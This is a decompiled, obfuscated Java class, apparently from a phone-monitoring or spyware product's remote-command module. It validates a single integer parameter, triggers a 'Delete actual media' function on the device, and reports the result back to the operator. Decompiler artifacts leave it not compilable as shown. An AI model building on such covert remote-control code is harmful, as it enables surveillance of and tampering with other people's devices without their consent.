package com.vvt.remotecommand.processor.d;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import java.util.ArrayList;
import java.util.Iterator;

public class a
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public a(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  private void a(ArrayList paramArrayList)
  {
    boolean bool1 = a;
    if (bool1) {}
    int i = paramArrayList.size();
    int j = 1;
    Object localObject;
    if (i != j)
    {
      localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject).<init>();
      throw ((Throwable)localObject);
    }
    try
    {
      Iterator localIterator = paramArrayList.iterator();
      for (;;)
      {
        boolean bool2 = localIterator.hasNext();
        if (!bool2) {
          break;
        }
        localObject = localIterator.next();
        localObject = (String)localObject;
        Integer.parseInt((String)localObject);
      }
      InvalidCommanFormatException localInvalidCommanFormatException;
      return;
    }
    catch (NumberFormatException localNumberFormatException)
    {
      localInvalidCommanFormatException = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      localInvalidCommanFormatException.<init>();
      throw localInvalidCommanFormatException;
    }
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = paramRemoteCommand.getParameters();
    a((ArrayList)localObject1);
    Object localObject2 = null;
    localObject1 = (String)((ArrayList)localObject1).get(0);
    int i = Integer.parseInt((String)localObject1);
    boolean bool3 = a;
    if (bool3) {}
    localObject2 = h();
    ControlCommand localControlCommand = new com/vvt/remotecontrol/ControlCommand;
    RemoteFunction localRemoteFunction = RemoteFunction.DELETE_ACTUAL_MEDIA;
    localObject1 = Integer.valueOf(i);
    localControlCommand.<init>(localRemoteFunction, localObject1);
    boolean bool2 = a;
    if (bool2) {}
    localObject2 = ((com.vvt.remotecontrol.a)localObject2).execute(localControlCommand);
    int k;
    if (paramc != null)
    {
      bool2 = localObject2 instanceof RmtCtrlOutputStatusMessage;
      if (bool2)
      {
        localObject1 = localObject2;
        localObject1 = (RmtCtrlOutputStatusMessage)localObject2;
        bool2 = ((RmtCtrlOutputStatusMessage)localObject1).isSuccess();
        k = a;
        if ((k != 0) && (!bool2)) {
          break label176;
        }
        bool2 = a;
        if (bool2) {}
        localObject1 = "";
        paramc.b(paramRemoteCommand, this, (String)localObject1);
      }
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return;
      label176:
      localObject2 = (RmtCtrlOutputStatusMessage)localObject2;
      localObject1 = ((RmtCtrlOutputStatusMessage)localObject2).getMessage();
      if (localObject1 != null)
      {
        int j = ((String)localObject1).length();
        k = 1;
        if (j > k)
        {
          boolean bool4 = a;
          if (bool4) {}
          localObject2 = new com/vvt/remotecommand/exception/RemoteCommandException;
          ((RemoteCommandException)localObject2).<init>((String)localObject1);
          paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject2);
          continue;
        }
      }
      bool2 = a;
      if (bool2) {}
      localObject1 = new com/vvt/remotecommand/exception/RemoteCommandException;
      localObject2 = "Unknown.";
      ((RemoteCommandException)localObject1).<init>((String)localObject2);
      paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject1);
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "Delete actual media";
  }
  
  public boolean f()
  {
    return false;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/d/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */